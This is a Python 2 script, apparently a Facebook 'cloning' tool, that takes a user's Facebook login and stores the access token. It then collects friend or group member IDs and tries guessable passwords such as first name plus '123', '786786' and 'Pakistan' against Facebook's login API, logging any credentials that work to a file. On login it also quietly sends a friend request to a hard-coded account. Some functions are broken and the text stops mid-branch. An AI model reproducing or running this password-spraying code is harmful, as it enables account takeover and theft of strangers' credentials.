#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To γπ΄π·ππ°ππ·π°πΌγ
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#Dev:Ehtasham_Rajpoot
##### LOGO #####
logo = """
\033[1;93mπ΄π·ππ°ππ·π°πΌ ππ°πΉπΏπΎπΎπ
\033[1;96mβ¦βββββββββββββββββββββ¦
\033[1;93mβββββββββββ
\033[1;93mβ ββ«β«ββ₯ π³π΄π³ππ΄π²οΏ­ββ«β«ββ£
\033[1;93mβββββββββββ
\033[1;96mβ¦βββββββββββββββββββββ¦
\033[1;97m:β’ββ’β¬ β¬ β¬ β¬ β¬ β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β’ββ’"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;93mπ΄π·ππ°ππ·π°πΌ ππ°πΉπΏπΎπΎπ
\033[1;96mβ¦βββββββββββββββββββββ¦
\033[1;93mβββββββββββ
\033[1;93mβ ββ«β«ββ₯ π³π΄π³ππ΄π²οΏ­ββ«β«ββ£
\033[1;93mβββββββββββ
\033[1;96mβ¦βββββββββββββββββββββ¦
\033[1;97m:β’ββ’β¬ β¬ β¬ β¬ β¬ β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β’ββ’"""

CorrectUsername = "dedsec"
CorrectPassword = "dedsec"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97mπ \x1b[1;93mTool Username \x1b[1;97mΒ»Β» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97mπ \x1b[1;91mTool Password  \x1b[1;97mΒ»Β» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:γπ΄π·ππ°ππ·π°πΌγ
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.youtube.com/watch?v=M8FccX1encw')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/watch?v=M8FccX1encw')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;93mWarning: \033[1;92mDo Not Use Your Personal Account' )
		jalan(' \033[1;93mWarning: \033[1;92mUse a New Account To Login' )               
		print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		print('\033[1;97mβ¬\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97mβ¬' )
		print('	' )
		id = raw_input('\033[1;97m[β] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')
		pwd = raw_input('\033[1;97m[β] \x1b[1;96mPassword\x1b[1;97m      : \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;91mLogin Successful.β’ββ’..'
				os.system('xdg-open https://www.youtube.com/watch?v=M8FccX1encw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;94mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print logo
	print "\033[1;93mΒ«--β’ββ’β’ββ’--\033[1;94mLogged in User Info\033[1;97m---β’ββ’β’ββ’---Β»"
	print "	   \033[1;93m ββ’β’βName\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
	print "	   \033[1;93m ββ’β’βID\033[1;94m:\033[1;92m"+id+"\x1b[1;96m              "
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m2.\x1b[1;92m Start Cloning Pakistan &(Group)"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m3.\x1b[1;96m Start Cloning Indonasia"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m4.\x1b[1;95m Start Cloning USA"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m5.\x1b[1;94m Start Cloning Bangladash"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m6.\x1b[1;93m Start Cloning All Country"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m7.\x1b[1;95m Start Cloning Member Group "
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m8.\x1b[1;92m Start Target  Attack"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m9.\x1b[1;91m Dedsec Massage "
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m10.\033[1;93mShow  Token"
        print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;94m11.\033[1;91mAfter Cloning Data Reset "
	print "\033[1;91m-β’ββ’-\033[1;97m> \033[1;97m0.\033[1;91m logout "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
        elif unikers =="2":
		crack()
        elif unikers =="3":
		hack()
        elif unikers =="4":
		black()
        elif unikers =="5":
		mafia()
        elif unikers =="6":
		test()
        elif unikers =="7":
		clone_dari_member_group()
        elif unikers =="8":
		os.system('clear')
		print logo
		brute()
        elif unikers =="9":
		os.system('clear')
		print logo
		print " \033[1;91mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’Massageβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\n"
                jalan('\033[1;92m............Massage..........')
                jalan("\033[1;96mFrends Tool everyDay Update")
                jalan('\033[1;96m11 Num Option Use every day ')
                jalan('\033[1;96mLIKE AND SUBSCRIBE CHANNEL')
                jalan("\033[1;93m.........Command...........")
                jalan('\033[1;96mapt update')
                jalan('\033[1;96mapt upgrade')
                jalan('\033[1;96mpkg install python')
                jalan('\033[1;96mpkg install python2')
                jalan('\033[1;96mpkg install git')
                jalan('\033[1;96mpip2 install requests')
                jalan('\033[1;96mpip2 install mechanize') 
                jalan("\033[1;96mgit clone https://github.com/dedsec999/Jerry")
                jalan('\033[1;96mcd Jerry')
                jalan('\033[1;96mpython2 JerryWorld.py')
                jalan('\033[1;96mUser: dedsec')
                jalan('\033[1;96mpass: dedsec')
                jalan('\033[1;92mπhttps://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIggπ')
                jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
        elif unikers =="10":
		os.system('reset')
		print logo
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print logo
		print " \033[1;92mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’Data Resetβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\n"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;93m-β’ββ’-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
        print "\033[1;93m-β’ββ’-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Jerry WhatsApp Group Pakistan."
        print "\033[1;93m-β’ββ’-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Jerry Group Cloning."
        print "\033[1;93m-β’ββ’-\033[1;97m> \033[1;91m4.\x1b[1;95mBlack Jerry Youtube Chenal."
	print "\033[1;93m-β’ββ’-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[β’ββ’] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			crack()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        elif peak =="2":
	        os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpfqr')
	        menu()
        elif peak =="3":
                os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idg=raw_input('\033[1;96m[+] \033[1;93mClone ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;96m[\033[1;97mβ\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup not found"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[βΊ] \033[1;93mClone ID \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak =="4":
	        os.system('xdg-open https://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIgg')
	        menu()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
	print "\n\033[1;91mΒ«--β’ββ’β’ββ’---\x1b[1;95mβ’ββ’Stop Process Press CTRL+Zβ’ββ’\033[1;91m---β’ββ’β’ββ’-Β»"
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:γπ΄π·ππ°ππ·π°πΌγ
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'								
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['123456789']
                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%π'						
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
